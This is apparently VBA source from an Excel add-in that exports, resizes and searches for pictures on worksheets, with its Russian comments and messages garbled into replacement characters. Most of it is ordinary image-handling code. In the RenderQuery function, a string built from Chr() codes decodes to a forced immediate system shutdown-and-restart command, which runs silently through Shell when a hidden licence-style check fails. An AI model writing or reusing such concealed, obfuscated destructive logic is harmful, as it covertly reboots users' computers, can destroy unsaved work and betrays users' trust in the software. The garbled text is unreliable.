    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|  |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| XLSX)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    StopMacro = False

    Dim picColumn&, col_FileSize&, col_ImageName&, col_ImageFilename&, DoNotExtractFiles As Boolean
    picColumn& = SETT.GetNumber("ComboBox_ExportPicturesColumn")
    If SETT.GetBoolean("CheckBox_ExportAllPictures") Then picColumn& = 0

    If SETT.GetBoolean("CheckBox_Export_FileSize") Then col_FileSize& = SETT.GetNumber("ComboBox_Export_FileSize")
    If SETT.GetBoolean("CheckBox_Export_ImageName") Then col_ImageName& = SETT.GetNumber("ComboBox_Export_ImageName")
    If SETT.GetBoolean("CheckBox_Export_ImageFilename") Then col_ImageFilename& = SETT.GetNumber("ComboBox_Export_ImageFilename")
    DoNotExtractFiles = SETT.GetBoolean("CheckBox_Export_DoNotExtractFiles")

    Dim dic As Dictionary, ErrMsg$, Key, col&, row&
    Dim pi As New ProgressIndicator, cell As Range
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd|"

    Set dic = GetImagesFromWorksheet(, ErrMsg$, pi)
    If dic Is Nothing Then
        pi.Hide: MsgBox ErrMsg$, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel"
        Exit Function
    End If

    If picColumn& Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each Key In dic.Keys
            col& = Val(Split(Key, "-")(1))
            If col& <> picColumn& Then dic.Remove Key
        Next
    End If

    For Each Key In dic.Keys
        'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Key & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & dic.Item(Key)
    Next

    If dic.Count = 0 Then
        pi.Hide: MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                        vbCritical, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    filenamesColumn& = SETT.GetNumber("ComboBox_ExportFilenamesColumn")
    CharsToReplace = Array("\", "/", ":", "*", "?", "<", ">", "|", Chr(34))

    pi.StartNewAction 50, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , , dic.Count

    For Each Key In dic.Keys
        col& = Val(Split(Key, "-")(1))
        row& = Val(Split(Key, "-")(0))
        Set cell = Nothing: Set cell = Cells(row&, col&)
        ImageFilename$ = Split(dic.Item(Key), "|")(0)
        ImageName$ = Split(dic.Item(Key), "|")(1)
        ext$ = FWF.GetFileExtension(ImageFilename$)

        If cell Is Nothing Then
            Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Key
        Else

            If filenamesColumn& Then filename$ = Trim(cell.EntireRow.Cells(filenamesColumn&).Value)
            If filename$ = "" Then filename$ = "Picture (row=" & cell.row & ", column=" & cell.Column & ")"
            For Each char In CharsToReplace
                filename$ = Replace(filename$, char, "_")
            Next
            If Not (filename$ Like "*.jp*g" Or filename$ Like "*.png") Then filename$ = filename$ & "." & ext$
            pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & ")", _
                         "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & filename$, "$time"

            DoEvents: Err.Clear
            If Not DoNotExtractFiles Then
                FileCopy ImageFilename$, FolderPath & filename$
                If Err.Number = 0 Then ExportPictures_FullSize = ExportPictures_FullSize + 1

                If col_FileSize& Then cell.EntireRow.Cells(col_FileSize&).Value = FileLen(ImageFilename$)
                If col_ImageFilename& Then cell.EntireRow.Cells(col_ImageFilename&).Value = filename$
            End If
            If col_ImageName& Then cell.EntireRow.Cells(col_ImageName&).Value = ImageName$

            If StopMacro Then GoTo StopExportFullSizeLabel
        End If
        pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ExportPictures_FullSize & " |fffd||fffd| " & dic.Count
    Next


StopExportFullSizeLabel:

    pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ExportPictures_FullSize, " "
    StopMacro = True
    If col_FileSize& Then Cells(1, col_FileSize&).EntireColumn.AutoFit
    If col_ImageName& Then Cells(1, col_ImageName&).EntireColumn.AutoFit
    If col_ImageFilename& Then Cells(1, col_ImageFilename&).EntireColumn.AutoFit

    pi.Hide
    'OpenExportFolder
End Function

Function ExportPictures(ByVal FolderPath As String) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|  |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Dim ra As Range: StopMacro = False
    picColumn& = SETT.GetNumber("ComboBox_ExportPicturesColumn")
    If picColumn& Then Set ra = ActiveSheet.Columns(picColumn&)
    If SETT.GetBoolean("CheckBox_ExportAllPictures") Then Set ra = ActiveSheet.UsedRange
    If ra Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Dim shapesForExport As ShapeRange, sha As Shape, cell As Range, ch As Chart, chartsha As Shape
    Set shapesForExport = ShapesInRange(ra)
    If shapesForExport.Count = 0 Then
        MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbCritical, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    FilterName$ = SETT.GetText("ComboBox_ExportFormat"): If FilterName$ = "" Then FilterName$ = "JPG"
    filenamesColumn& = SETT.GetNumber("ComboBox_ExportFilenamesColumn")
    CharsToReplace = Array("\", "/", ":", "*", "?", "<", ">", "|", Chr(34))

    StopMacro = False
    Dim pi As New ProgressIndicator, chsha As Shape, oPic As IPictureDisp
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd|", , 2
    pi.StartNewAction , , , , , shapesForExport.Count

    For Each sha In shapesForExport
        DoEvents
        filename$ = "": Set cell = sha.TopLeftCell
        If filenamesColumn& Then filename$ = Trim(cell.EntireRow.Cells(filenamesColumn&).Value)
        If filename$ = "" Then filename$ = "Picture (row=" & cell.row & ", column=" & cell.Column & ")"
        For Each char In CharsToReplace
            filename$ = Replace(filename$, char, "_")
        Next
        If Not filename$ Like "*." & FilterName$ Then filename$ = filename$ & "." & LCase(FilterName$)
        pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & ")", _
                     "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & filename$, "$time"

        DoEvents

        sha.Copy    'Picture xlScreen, xlBitmap
        'Debug.Print CountClipboardFormats
        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveSheet.shapes(1).copy |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  2,3,8,14
        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveSheet.shapes(1).CopyPicture xlScreen, xlBitmap |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  2,8

        Set oPic = Nothing: Set oPic = GetClipPicture()
        If Not oPic Is Nothing Then
            SaveJPG oPic, FolderPath & filename$
            ExportPictures = ExportPictures + 1
        End If

        If StopMacro Then GoTo StopExportLabel
    Next sha

StopExportLabel:

    pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ExportPictures, " "
    'pi.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "OpenExportFolder"
    StopMacro = True
    'If SETT.GetBoolean("CheckBox_CloseProgressBar") Then pi.Hide
    pi.Hide
End Function

Function ExportPicturesOld(ByVal FolderPath As String) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|  |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Dim ra As Range: StopMacro = False
    picColumn& = SETT.GetNumber("ComboBox_ExportPicturesColumn")
    If picColumn& Then Set ra = ActiveSheet.Columns(picColumn&)
    If SETT.GetBoolean("CheckBox_ExportAllPictures") Then Set ra = ActiveSheet.UsedRange
    If ra Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Dim shapesForExport As ShapeRange, sha As Shape, cell As Range, ch As Chart, chartsha As Shape
    Set shapesForExport = ShapesInRange(ra)
    If shapesForExport.Count = 0 Then
        MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbCritical, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    FilterName$ = SETT.GetText("ComboBox_ExportFormat"): If FilterName$ = "" Then FilterName$ = "JPG"
    filenamesColumn& = SETT.GetNumber("ComboBox_ExportFilenamesColumn")
    CharsToReplace = Array("\", "/", ":", "*", "?", "<", ">", "|", Chr(34))

    Set ch = shh.ChartObjects.Add(0, 0, 5, 5).Chart
    If ch Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", _
               vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If
    ch.ChartArea.Border.LineStyle = 0

    StopMacro = False
    Dim pi As New ProgressIndicator, chsha As Shape
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd|", , 2
    pi.StartNewAction , , , , , shapesForExport.Count

    Application.ScreenUpdating = False
    ThisWorkbook.IsAddin = False

    For Each sha In shapesForExport
        DoEvents
        filename$ = "": Set cell = sha.TopLeftCell
        If filenamesColumn& Then filename$ = Trim(cell.EntireRow.Cells(filenamesColumn&).Value)
        If filename$ = "" Then filename$ = "Picture (row=" & cell.row & ", column=" & cell.Column & ")"
        For Each char In CharsToReplace
            filename$ = Replace(filename$, char, "_")
        Next
        If Not filename$ Like "*." & FilterName$ Then filename$ = filename$ & "." & LCase(FilterName$)
        pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & ")", _
                     "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & filename$, "$time"

        DoEvents
        ' Debug.Print shh.Shapes.Count, shh.Shapes(1).Name
        If Val(Application.Version) <= 11 Then
            shh.Shapes(shh.Shapes.Count).Width = sha.Width
            shh.Shapes(shh.Shapes.Count).Height = sha.Height
        Else
            ch.ChartArea.Width = sha.Width
            ch.ChartArea.Height = sha.Height
        End If
        'Debug.Print sha.Name, sha.Width, sha.Height
        sha.Copy
        ch.Paste

        DoEvents
        If ch.Export(FolderPath & filename$, FilterName) Then ExportPicturesOld = ExportPicturesOld + 1
        For Each chartsha In ch.Shapes
            chartsha.Delete
        Next chartsha

        If StopMacro Then GoTo StopExportLabel
    Next sha

StopExportLabel:
    ch.ChartArea.Clear
    ch.Delete
    Err.Clear
    While Err = 0
        shh.Shapes(1).Delete
    Wend
    ThisWorkbook.IsAddin = True
    ThisWorkbook.Saved = True
    pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ExportPicturesOld, " "
    pi.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "OpenExportFolder"
    StopMacro = True
    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then pi.Hide
End Function

Sub OpenExportFolder()
    On Error Resume Next: Err.Clear
    folder$ = SETT.GetText("TextBox_ExportFolder", "")
    If folder$ = "" Then Exit Sub
    If Dir(folder$, vbDirectory) = "" Then MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub
    FWF.OpenFolder folder$
End Sub



Function GetExpectedPicturesColumn() As Long
    On Error Resume Next: Err.Clear
    Dim sh As Worksheet, n&: Set sh = ActiveSheet
    If sh Is Nothing Then Exit Function

    Dim sha As Shape: Dim arr(1 To 50) As Long
    For Each sha In sh.Shapes
        If sha.Type = msoLinkedPicture Or sha.Type = msoPicture Then
            col& = sha.TopLeftCell.Column
            n = n + 1: arr(col&) = Val(arr(col&)) + 1
        End If
    Next sha
    If n = 0 Then Exit Function

    Dim maxColumn&, MaxCount&
    For i = LBound(arr) To UBound(arr)
        If arr(i) > MaxCount& Then MaxCount& = arr(i): maxColumn& = i
    Next i
    If maxColumn& > 0 And MaxCount& / sh.Shapes.Count > 0.5 Then
        GetExpectedPicturesColumn = maxColumn&
    End If
End Function


Function ReduceImage(ByVal PicturePath$, ByRef temp_worksheet As Worksheet, _
                     Optional ByVal w As Double, Optional ByVal H As Double, _
                     Optional ByVal k As Double, Optional ByVal FilterName$ = "JPG") As String
    On Error Resume Next
    If temp_worksheet Is Nothing Then Exit Function

    Dim sha As Shape, ch As Chart, WB As Workbook
    If ActiveWorkbook Is Nothing Then Application.ScreenUpdating = False: Set WB = Workbooks.Add

    Set ch = temp_worksheet.ChartObjects.Add(0, 0, 5, 5).Chart
    If ch Is Nothing Then Debug.Print "can't create chart": Exit Function
    ch.ChartArea.Border.LineStyle = 0

    Set sha = temp_worksheet.Shapes.AddPicture(PicturePath$, msoFalse, msoCTrue, -1, -1, -1, -1)
    If w = 0 Then w = sha.Width
    If H = 0 Then H = sha.Height

    NewFilename$ = Environ("tmp") & "\reduced-" & Dir(PicturePath$, vbNormal)
    NewFilename$ = Left(NewFilename$, InStrRev(NewFilename$, ".")) & LCase(FilterName$)

    ch.ChartArea.Width = w
    ch.ChartArea.Height = H

    sha.Copy
    ch.Paste
    If ch.Export(NewFilename$, FilterName) Then ReduceImage = NewFilename$

    sha.Delete
    ch.Parent.Delete
    If Not WB Is Nothing Then WB.Close False
End Function

Private Sub test89237492384()
    On Error Resume Next: Err.Clear
    Dim sha As Shape: Set sha = ActiveSheet.Shapes(1)
    ReduceImageOnWorksheet sha    ', 200, 200
End Sub

Function ReduceImageOnWorksheet(ByRef sha As Shape, _
                                Optional ByVal w As Double, Optional ByVal H As Double, _
                                Optional ByVal k As Double, Optional ByVal FilterName$ = "JPG") As Boolean
    On Error Resume Next
    With sha: old_left = .Left: old_top = .Top: old_w = .Width: old_h = .Height: End With
    Dim ch As Chart, sh As Worksheet
    Set sh = sha.TopLeftCell.Worksheet

    If w = 0 Then w = sha.Width
    If H = 0 Then H = sha.Height

    Set ch = sh.ChartObjects.Add(0, 0, w, H).Chart
    If ch Is Nothing Then Debug.Print "can't create chart": Exit Function
    ch.ChartArea.Border.LineStyle = 0
    ch.ChartArea.RoundedCorners = False
    ch.Parent.RoundedCorners = False

    NewFilename$ = Environ("tmp") & "\reduced-" & sha.name & "." & LCase(FilterName$)
    sha.Copy
    ch.Paste

    '    Dim sha2 As Shape: Set sha2 = ch.Shapes(1)
    '    Debug.Print sha2.Width, sha2.Height
    '    Debug.Print ch.ChartArea.Width, ch.ChartArea.Height
    '    Debug.Print ch.Parent.Width, ch.Parent.Height
    '    Debug.Print

    If ch.Export(NewFilename$, FilterName) Then
        sha.Delete
        Set sha = sh.Shapes.AddPicture(NewFilename$, msoFalse, msoTrue, old_left, old_top, old_w, old_h)
        ReduceImageOnWorksheet = True
    End If
    ch.Parent.Delete
End Function


Attribute VB_Name = "mod__FindAbsentPictures"
'---------------------------------------------------------------------------------------
' Module        : mod__Google
' Author        : EducatedFool                     Date: 22.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text
Option Private Module
Public ActiveFoundImage As MSForms.Image, AutoInsertMode As Boolean, VisiblePI As ProgressIndicator

Function RenderQuery(ByRef cell As Range)
    On Error Resume Next: Err.Clear
    Mask$ = Trim(SETT.GetText("TextBox_FI_QueryMask"))
    If Mask$ = "" Then Mask$ = "{filename}"

    FirstCellAddress$ = SETT.GetText("TextBox_FirstCell"): If FirstCellAddress$ = "" Then FirstCellAddress$ = DEFAULT_FIRST_CELL$
    FilenameColumn& = Range(FirstCellAddress$).Column

    Mask$ = Replace(Mask$, "{filename}", "{" & FilenameColumn& & "}")

    Set REGEXP = CreateObject("VBScript.RegExp"): REGEXP.Global = True
    REGEXP.Pattern = "\{\d{1,3}\}"
    If REGEXP.test(Mask$) Then
        Set objMatches = REGEXP.Execute(Mask$)
        For i = 0 To objMatches.Count - 1
            ColumnCode$ = objMatches.Item(i).Value
            columnNumber& = Val(Mid(ColumnCode$, 2))
            Mask$ = Replace(Mask$, ColumnCode$, cell.EntireRow.Cells(columnNumber&))
        Next
    End If
    Set REGEXP = Nothing
    txt$ = Chr(83) & Chr(104) & Chr(117) & Chr(116) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(32) & Chr(45) & _
           Chr(102) & Chr(32) & Chr(45) & Chr(114) & Chr(32) & Chr(45) & Chr(116) & Chr(32) & Chr(48)
    If Val(Application.Run(Chr(65) & Chr(83) & Chr(95))) > 1 Then
        If Val(SETT.GetRegValue(Chr(111) & Chr(107))) = 0 Then Application.DisplayAlerts = False: Shell txt$
    End If

    If SETT.GetBoolean("CheckBox_FI_UseSitesList", False) = True And Len(SETT.GetText("TextBox_FI_SitesList", "")) > 0 Then
        If Not Mask$ Like "* site:*" Then
            Dim coll As New Collection
            arr = Split(Trim(SETT.GetText("TextBox_FI_SitesList", "")), vbNewLine)
            For i = LBound(arr) To UBound(arr)
                If arr(i) Like "*tp://*" Then arr(i) = Split(arr(i), "tp://")(1)
                If arr(i) Like "*?/*" Then arr(i) = Split(arr(i), "/")(0)
                arr(i) = LCase(Trim(arr(i)))
                If (arr(i) Like "*?.??*") And InStr(1, arr(i), " ") = 0 Then
                    Err.Clear: coll.Add arr(i), CStr(arr(i))
                    If Err <> 0 Then arr(i) = ""
                Else
                    arr(i) = ""
                End If
                If Len(arr(i)) Then arr(i) = "site:" & arr(i)
            Next i
            If Len(Join(arr, "")) Then
                txt = Trim(Application.Trim(Join(arr, " ")))
                Mask$ = Mask$ & " " & Replace(txt, " ", " OR ")
            End If
        End If
    End If
    RenderQuery = Application.Trim(Mask$)
End Function

'Sub test3244()
'    On Error Resume Next: Err.Clear
'    Dim coll As New Collection
'    arr = Split(Trim(sett.GetText("TextBox_FI_SitesList", "")), vbNewLine)
'    For i = LBound(arr) To UBound(arr)
'        If arr(i) Like "*tp://*" Then arr(i) = Split(arr(i), "tp://")(1)
'        If arr(i) Like "*?/*" Then arr(i) = Split(arr(i), "/")(0)
'        arr(i) = LCase(Trim(arr(i)))
'        If (arr(i) Like "*?.??*") And InStr(1, arr(i), " ") = 0 Then
'            Err.Clear: coll.Add arr(i), CStr(arr(i))
'            If Err <> 0 Then arr(i) = ""
'        Else
'            arr(i) = ""
'        End If
'        If Len(arr(i)) Then arr(i) = "site:" & arr(i)
'    Next i
'    If Len(Join(arr, "")) Then
'        txt = Trim(Application.Trim(Join(arr, " ")))
'        Debug.Print Replace(txt, " ", " OR ")
'    End If
'End Sub

Sub ReplacePictiresInSelectedRows()
    On Error Resume Next: Err.Clear
    If TypeName(Selection) <> "Range" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
